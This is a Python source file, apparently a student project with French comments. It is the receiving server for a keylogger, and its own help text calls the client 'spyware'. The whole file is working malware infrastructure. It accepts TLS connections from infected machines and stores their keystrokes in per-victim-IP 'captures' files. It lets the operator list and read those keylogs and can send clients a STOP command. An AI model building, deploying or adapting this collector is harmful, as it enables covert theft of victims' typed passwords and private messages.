import socket
import datetime
import argparse
import time
import sys
import os
from pathlib import Path
from threading import Thread
import ssl

# Arguments 

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()
group.add_argument("-l", "--listen", type=int, help="listens on the TCP port entered by the user and waits for the spyware data.")
group.add_argument("-s", "--show", help="displays the list of files received by the program.", action="store_true")
group.add_argument("-r", "--readfile", type=str, help="displays the content of a keylog file.")
group.add_argument("-k", "--kill", help="stop all the instances of the server and stop all the clients.", action="store_true")
args = parser.parse_args()


#Variables

cwd = Path.cwd()
path_captures = cwd / "captures"

# Fonctions

def handle_data(data, addr):

    fic = list(path_captures.glob(f"{addr[0]}*.txt"))
    filename = path_captures / f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
    
    if fic == []:
        with open(filename, 'w') as file:
            file.write(data)
    else:
        ficfilename = fic[0]
        with open(ficfilename, 'a') as file:
            file.write(f"\n{data}")
        os.rename(ficfilename,filename)

    print(f"Data received and saved in {filename}")



def display_files():
    files = os.listdir(path_captures)
    print("List of files captured :")
    for file in files:
        print(" - " + file)
    
    if files == []:
        print("No files captured yet")

def read_file(filename):

    try :
        with open ("captures/" + filename, "r") as file:
            print("File content :")
            content = file.read()
            print(content)
    except FileNotFoundError:
        print(f"File '{filename}' not found in the 'captures' folder.")
        display_files()

# Traitement

if args.listen:
    # Configuration du socket
    host = '172.16.120.1'
    port = args.listen

    # crétaion et configuration du socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_socket.bind((host, port))
    server_socket.listen()

    print(f"Server listening on {host}:{port}")

    running = True
    return_code = "OK"


    # récupération de la connexion
    conn, addr = server_socket.accept()

    # création du contexte ssl (avec le certificat et la clé privée)
    context_ssl = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context_ssl.load_cert_chain(certfile="./ssl2/certificate.pem", keyfile="./ssl2/private.pem")
    
    # utilisation du SSL pour lire les données entrantes
    ssl_socket = context_ssl.wrap_socket(conn, server_side=True)


    while running:
        try:
    
            # Réception des données
            print("wait for data")
            data = ssl_socket.recv(1024).decode('utf-8')

            if data == "":
                print("client dead ?")
                running = False

            # si des données ont été réceptionnées
            if data:
                handle_data(data, addr)

                # renvoyer un code
                if return_code == "OK":
                    print("[+] Keep running")
                    ssl_socket.send("OK".encode("utf-8"))

                else:
                    print("send stop code")
                    ssl_socket.send("STOP".encode("utf-8"))
                    running = False

                    # temps de pause pour éviter de couper la connexion au moment de l'envoi du code STOP
                    time.sleep(1)


        # interception du KeyboardInterrupt
        except KeyboardInterrupt as e:
            answered = False
            
            while not answered:
                respons = input("[?] Voulez-vous vraiment arrêter le serveur ? (y/n) ")

                if respons == 'y' or respons == 'n':
                    answered = True

            if respons == 'n' or respons == 'N':
                # ne rien faire
                print("[+] Le serveur ne sera pas arrêté")


            else:
                # arrêter le serveur
                print("[+] Le serveur va s'arrêter")

                return_code = "STOP"


        except Exception as e:
            running = False
            print(f"Error Main : {e}")

        

    ssl_socket.close()
    server_socket.close()


elif args.show:
    display_files()
    sys.exit()




elif args.readfile:
    read_file(args.readfile)
    sys.exit()



elif args.kill:
    print("kill all the instances")



